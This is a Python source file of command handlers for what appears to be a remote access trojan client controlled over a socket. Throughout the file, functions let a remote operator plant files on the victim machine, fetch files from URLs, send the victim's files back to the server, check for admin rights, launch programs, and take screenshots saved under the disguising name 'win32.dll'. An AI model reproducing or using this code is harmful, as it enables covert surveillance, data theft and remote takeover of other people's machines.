from socket_handlers import *
from urllib.parse import unquote
import os, base64, binascii, requests, ctypes, subprocess
from pathvalidate import sanitize_filename, sanitize_filepath
from typing import Tuple
from mss import mss


def pwd(socket):
    socket_send(socket, os.getcwd().encode("utf-8"))


def upload(socket, command):
    try:
        # Get file path from command (safer than direct slicing)
        file_path = command.strip()
        if not file_path:
            socket_send(socket, "Error: No file path specified")
            return "[!] Error"

        # Validate file path (basic security check)
        if any(
            char in file_path
            for char in ["..", "~", "/", "\\"]
            if char not in os.path.basename(file_path)
        ):
            socket_send(socket, "Error: Invalid file path")
            return "[!] Error"

        # Receive file data
        data = socket_recv(socket)

        # Check if file exists to avoid overwriting
        if os.path.exists(file_path):
            socket_send(socket, f"Error: File {file_path} already exists")
            return "[!] Error"

        # Create directory if needed
        os.makedirs(os.path.dirname(file_path), exist_ok=True)

        # Write file with proper error handling
        try:
            decoded_data = base64.b64decode(data)
            with open(file_path, "wb") as fp:
                fp.write(decoded_data)

            # Verify file was written correctly
            if os.path.getsize(file_path) == len(decoded_data):
                socket_send(
                    socket, f"Success: {file_path} uploaded ({len(decoded_data)} bytes)"
                )
            else:
                socket_send(socket, f"Error: File size mismatch after upload")
                os.remove(file_path)  # Clean up partial file

        except (IOError, OSError) as e:
            socket_send(socket, f"Error: Failed to write file - {str(e)}")
            if os.path.exists(file_path):
                os.remove(file_path)  # Clean up partial file
        except binascii.Error:
            socket_send(socket, "Error: Invalid base64 data received")
    except Exception as e:
        socket_send(socket, f"Error: Unexpected error during upload - {str(e)}")


def urldownload(socket, url, max_size_mb=10, timeout=30):
    try:
        with requests.head(url, timeout=timeout) as head_response:
            head_response.raise_for_status()

            if head_response.status_code != 200:
                socket_send(
                    socket,
                    f"Error: Server returned status code {head_response.status_code}",
                )
                return "[!] Error"

            content_type = head_response.headers.get("Content-Type", "")
            if not content_type.startswith(("image/", "application/octet-stream")):
                socket_send(socket, f"Error: Unsupported content type: {content_type}")
                return "[!] Error"

            content_length = int(head_response.headers.get("Content-Length", 0))
            max_size_bytes = max_size_mb * 1024 * 1024
            if content_length > max_size_bytes:
                socket_send(
                    socket,
                    f"Error: File size exceeds maximum allowed size ({max_size_mb}MB)",
                )
                return "[!] Error"

        with requests.get(url, stream=True, timeout=timeout) as response:
            response.raise_for_status()

            file_name = unquote(url.split("/")[-1])
            file_name = sanitize_filename(file_name)

            if not file_name:
                file_name = "downloaded_file"

            with open(file_name, "wb") as fp:
                downloaded_size = 0
                for chunk in response.iter_content(chunk_size=8192):
                    if chunk:
                        fp.write(chunk)
                        downloaded_size += len(chunk)

                        if downloaded_size > max_size_bytes:
                            os.remove(file_name)
                            socket_send(
                                socket, f"Error: File size exceeded during download"
                            )
                            return "[!] Error"
            socket_send(
                socket,
                f"'{file_name}' successfully downloaded ({downloaded_size/1024:.2f} KB)",
            )
            return True

    except requests.exceptions.RequestException as e:
        socket_send(socket, f"[!] Error: Network error: {str(e)}")
    except IOError as e:
        socket_send(socket, f"[!] Error: File system error: {str(e)}")
    except Exception as e:
        socket_send(socket, f"[!] Error: Unexpected error: {str(e)}")


def send_file_to_server(sock, file_path, max_size_mb=10):
    try:
        file_path = sanitize_filepath(file_path)
        if not os.path.exists(file_path):
            socket_send(sock, "Error: File Not Found!")
            return "[!] Error"

        if not os.path.isfile(file_path):
            socket_send(sock, "Error: Path is not a file!")
            return "[!] Error"

        file_size = os.path.getsize(file_path)
        max_size_bytes = max_size_mb * 1024 * 1024
        if file_size > max_size_bytes:
            socket_send(sock, f"Error: File size exceeds {max_size_mb}MB limit!")
            return "[!] Error"

        chunk_size = 8192  # 8KB
        with open(file_path, "rb") as fp:
            file_info = {
                "name": os.path.basename(file_path),
                "size": file_size,
                "chunks": (file_size // chunk_size) + 1,
            }
            socket_send(sock, base64.b64encode(str(file_info).encode()))

            for chunk in iter(lambda: fp.read(chunk_size), b""):
                socket_send(sock, base64.b64encode(chunk))

        socket_send(sock, "[+] File Transfer Complete")
        return True

    except PermissionError:
        socket_send(sock, "[!] Error: Permission denied!")
        return "[!] Error"
    except IOError as e:
        socket_send(sock, f"[!] Error: I/O operation failed - {str(e)}")
        return "[!] Error"
    except Exception as e:
        socket_send(sock, f"[!] Error: Unexpected error - {str(e)}")
        return "[!] Error"


def check_admin_privileges(socket) -> Tuple[bool, str]:
    try:
        if os.name == "nt":
            try:
                is_admin = ctypes.windll.shell32.IsUserAnAdmin() != 0
                if is_admin:
                    socket_send(
                        socket, "[+] Administrator Privileges (Windows API Check)"
                    )
                    return True
            except (AttributeError, OSError):
                pass

        system_root = os.environ.get("SystemRoot", "C:\\Windows")
        test_path = os.path.join(system_root, "temp")

        try:
            os.listdir(test_path)
            test_file = os.path.join(test_path, "admin_test.tmp")
            with open(test_file, "w") as f:
                f.write("test")
            os.remove(test_file)
            socket_send(
                socket, "[+] Administrator Privileges (System Directory Access)"
            )
            return True
        except (IOError, OSError, PermissionError) as e:
            if os.path.exists(test_file):
                try:
                    os.remove(test_file)
                except:
                    pass
            error_type = type(e).__name__
            socket_send(socket, f"[+] User Privileges (Access Denied: {error_type})")
            return False

    except Exception as e:
        error_type = type(e).__name__
        socket_send(socket, f"[!] Privilege Check Error: {error_type}")
        return False


def execute_program(socket, command: str) -> Tuple[bool, str]:
    try:
        executable = command[4:] if command.startswith("run ") else command

        if not executable.strip():
            socket_send(socket, "[!] Empty command")
            return False

        process = subprocess.Popen(
            executable,
            shell=False,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            stdin=subprocess.PIPE,
        )

        if process.poll() is not None:
            _, stderr = process.communicate()
            err_msg = stderr.decode("utf-8", errors="replace").strip()
            socket_send(socket, f"[!] Failed to start: {err_msg or 'Unknown error'}")
            return False

        socket_send(socket, "[+] Program started successfully")
        return True

    except FileNotFoundError:
        socket_send(socket, "[!] Program not found")
        return False
    except PermissionError:
        socket_send(socket, "[!] Permission denied")
        return False
    except Exception as e:
        error_type = type(e).__name__
        socket_send(socket, f"[!] Execution failed ({error_type})")
        return False


def take_screenshot(socket) -> bool:
    screenshot_file = "win32.dll"

    try:
        # Take screenshot
        with mss() as screenshot_tool:
            try:
                screenshot_tool.shot(output=screenshot_file)
            except Exception as e:
                socket_send(socket, f"[!] Screenshot capture failed: {str(e)}")
                return False

        # Read and send screenshot data
        try:
            with open(screenshot_file, "rb") as fp:
                screenshot_data = fp.read()
                fp.close()

            if not screenshot_data:
                socket_send(socket, "[!] Screenshot file is empty")
                return False

            # Encode and send the data
            encoded_data = base64.b64encode(screenshot_data)
            socket_send(socket, encoded_data)

        except IOError as e:
            socket_send(socket, f"[!] Error reading screenshot file: {str(e)}")
            return False
        except Exception as e:
            socket_send(socket, f"[!] Error processing screenshot: {str(e)}")
            return False

        return True

    except Exception as e:
        socket_send(socket, f"[!] Unexpected error during screenshot: {str(e)}")
        return False
